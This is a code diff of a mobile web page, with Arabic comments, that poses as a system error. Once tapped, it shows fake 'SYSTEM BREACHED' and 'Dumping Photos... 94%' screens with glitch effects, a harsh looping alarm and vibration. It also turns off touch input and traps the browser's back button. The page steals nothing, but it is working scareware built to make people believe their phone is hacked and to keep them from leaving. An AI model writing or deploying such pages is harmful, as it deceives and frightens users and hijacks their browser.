@@ -3,114 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_CRITICAL_FAILURE</title>
+    <title>🚨 FATAL_ERROR_0x666</title>
     <style>
-        body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%;
-            background: black; overflow: hidden; font-family: monospace;
-            touch-action: none;
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: black; overflow: hidden; touch-action: none; font-family: 'Courier New', Courier, monospace; }
+        .layer { position: fixed; width: 100%; height: 100%; top: 0; left: 0; display: none; }
+        
+        /* مطر الأكواد الخضراء */
+        #m { display: block; background: black; }
+        /* تشويش التلفاز */
+        #s { background: url('https://media.giphy.com/media/oEI9uWUicKgS2UzSsw/giphy.gif'); background-size: cover; opacity: 0.7; }
+        /* نصوص قوس قزح السريعة */
+        #r { background: black; display: flex; justify-content: center; align-items: center; flex-direction: column; }
+        .t { font-size: 40px; font-weight: bold; animation: rb 0.1s infinite, sk 0.05s infinite; text-align: center; }
 
-        /* شقوق الشاشة - صورة بديلة ومؤكدة */
-        #crack {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('https://www.transparenttextures.com/patterns/cracked-glass.png'), 
-                        url('https://pngimg.com/uploads/broken_glass/broken_glass_PNG30.png');
-            background-size: cover; z-index: 10000; pointer-events: none; display: none;
-            filter: invert(1);
-        }
-
-        .layer { position: fixed; width: 100%; height: 100%; top: 0; left: 0; display: none; z-index: 1; }
-
-        /* مطر الأكواد */
-        #matrix-layer { display: block; background: black; }
-        canvas { display: block; filter: brightness(1.5); }
-
-        /* تشويش أبيض وأسود */
-        #static-layer {
-            background: url('https://media.giphy.com/media/oEI9uWUicKgS2UzSsw/giphy.gif');
-            background-size: cover; opacity: 0.8;
-        }
-
-        /* نصوص قوس قزح */
-        #rainbow-layer {
-            background: black; display: flex; justify-content: center; align-items: center; flex-direction: column;
-        }
-        .rainbow-text {
-            font-size: 40px; font-weight: bold; text-align: center;
-            animation: rainbow 0.1s infinite, shake 0.05s infinite;
-        }
-
-        @keyframes rainbow {
-            0% { color: #ff0000; } 25% { color: #00ff00; } 50% { color: #0000ff; } 75% { color: #ffff00; } 100% { color: #ff00ff; }
-        }
-
-        @keyframes shake {
-            0% { transform: translate(-10px, 5px); } 50% { transform: translate(10px, -5px); } 100% { transform: translate(-5px, 10px); }
+        @keyframes rb { 0%{color:red;} 20%{color:yellow;} 40%{color:lime;} 60%{color:cyan;} 80%{color:magenta;} 100%{color:red;} }
+        @keyframes sk { 0%{transform:translate(5px,5px);} 50%{transform:translate(-5px,-5px);} 100%{transform:translate(5px,5px);} }
+        
+        /* رسم الشقوق برمجياً (SVG) - مستحيل ما تظهر */
+        #c { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; pointer-events: none; display: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100%25' height='100%25'%3E%3Cpath d='M0,0 L100,200 L50,300 L0,500 M100,0 L150,150 L100,400 L200,500 M200,0 L180,250 L250,350 L300,500 M300,0 L280,100 L350,200 L400,500' stroke='white' stroke-width='2' fill='none'/%3E%3Cpath d='M0,100 L500,150 M0,300 L500,250 M0,450 L500,420' stroke='white' stroke-width='1' opacity='0.5' fill='none'/%3E%3C/svg%3E");
+            background-size: cover; filter: drop-shadow(0 0 5px white);
         }
     </style>
 </head>
-<body onclick="launchChaos()">
+<body onclick="start()">
 
-    <div id="crack"></div>
-    <div id="matrix-layer" class="layer"><canvas id="q"></canvas></div>
-    <div id="static-layer" class="layer"></div>
-    <div id="rainbow-layer" class="layer">
-        <div class="rainbow-text">CORE_SYSTEM_FAILURE</div>
-        <div class="rainbow-text" style="font-size: 15px;">WIPING_PRIVATE_STORAGE_88%</div>
-    </div>
+    <div id="c"></div>
+    <div id="m" class="layer"><canvas id="q"></canvas></div>
+    <div id="s" class="layer"></div>
+    <div id="r" class="layer"><div class="t">SYSTEM BREACHED</div><div class="t" style="font-size:20px; color:white; animation:none;">Dumping Photos... 94%</div></div>
 
-    <div id="start" style="color:white; text-align:center; padding-top:45vh; position:relative; z-index:10001;">
-        <h2 style="color:red; animation: blink 0.5s infinite;">⚠️ SYSTEM ERROR</h2>
-        <p>انقر لإصلاح أخطاء النظام</p>
+    <div id="gate" style="color:white; text-align:center; padding-top:45vh; z-index:10001; position:relative; cursor:pointer;">
+        <h2 style="color:red; animation: blink 0.5s infinite;">⚠️ SYSTEM WARNING</h2>
+        <p>اضغط فوراً لإصلاح خطأ قاعدة البيانات</p>
     </div>
 
     <script>
-        // Matrix Code
-        var s = window.screen;
-        var width = q.width = s.width;
-        var height = q.height = s.height;
-        var letters = Array(256).join(1).split('');
+        // Matrix Effect
+        var q = document.getElementById('q'), s = window.screen, w = q.width = s.width, h = q.height = s.height, p = Array(256).join(1).split('');
         var draw = function () {
-            q.getContext('2d').fillStyle = 'rgba(0,0,0,.05)';
-            q.getContext('2d').fillRect(0,0,width,height);
-            q.getContext('2d').fillStyle = '#0F0';
-            letters.map(function(y_pos, index){
-                text = String.fromCharCode(1e2+Math.random()*33);
-                q.getContext('2d').fillText(text, index * 10, y_pos);
-                letters[index] = (y_pos > 758 + Math.random() * 1e4) ? 0 : y_pos + 10;
-            });
+            var ctx = q.getContext('2d'); ctx.fillStyle = 'rgba(0,0,0,.05)'; ctx.fillRect(0,0,w,h); ctx.fillStyle = '#0F0';
+            p.map(function(y, i){ ctx.fillText(String.fromCharCode(1e2+Math.random()*33), i*10, y); p[i] = (y > 758 + Math.random()*1e4) ? 0 : y+10; });
         };
 
-        function launchChaos() {
-            document.getElementById('start').style.display = 'none';
-            document.getElementById('crack').style.display = 'block';
-            document.body.style.pointerEvents = "none"; 
+        function start() {
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('c').style.display = 'block';
+            document.body.style.pointerEvents = "none"; // تعطيل المس
             setInterval(draw, 33);
 
-            const layers = [
-                document.getElementById('matrix-layer'),
-                document.getElementById('static-layer'),
-                document.getElementById('rainbow-layer')
-            ];
-
-            let i = 0;
+            // تبديل الطبقات كل 0.8 ثانية (ماتريكس، تشويش، قوس قزح)
+            let layers = [document.getElementById('m'), document.getElementById('s'), document.getElementById('r')];
+            let curr = 0;
             setInterval(() => {
                 layers.forEach(l => l.style.display = 'none');
-                layers[i].style.display = 'block';
-                i = (i + 1) % layers.length;
-                if (navigator.vibrate) navigator.vibrate(100);
-            }, 800); // تبديل كل أقل من ثانية لزيادة الرعب
+                layers[curr].style.display = 'block';
+                curr = (curr + 1) % layers.length;
+                if(navigator.vibrate) navigator.vibrate(200);
+            }, 800);
 
-            // صوت طنين إلكتروني مزعج جداً
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.type = 'sawtooth';
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.start();
-            setInterval(() => { osc.frequency.value = Math.random() * 800 + 200; }, 50);
+            // 🔊 إنذار طوارئ حقيقي (صوت حاد ومزعج يقطع)
+            const ac = new (window.AudioContext || window.webkitAudioContext)();
+            const o1 = ac.createOscillator();
+            const o2 = ac.createOscillator();
+            const g = ac.createGain();
+            o1.type = 'sawtooth'; o2.type = 'square';
+            o1.frequency.value = 440; o2.frequency.value = 466; // نشاز متعمد
+            o1.connect(g); o2.connect(g); g.connect(ac.destination);
+            o1.start(); o2.start();
+
+            // جعل الصوت "بيب بيب" سريع جداً
+            setInterval(() => { g.gain.value = (g.gain.value === 0 ? 0.6 : 0); }, 150);
+            
+            // منع الرجوع
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() { window.history.go(1); };
         }
     </script>
 </body>
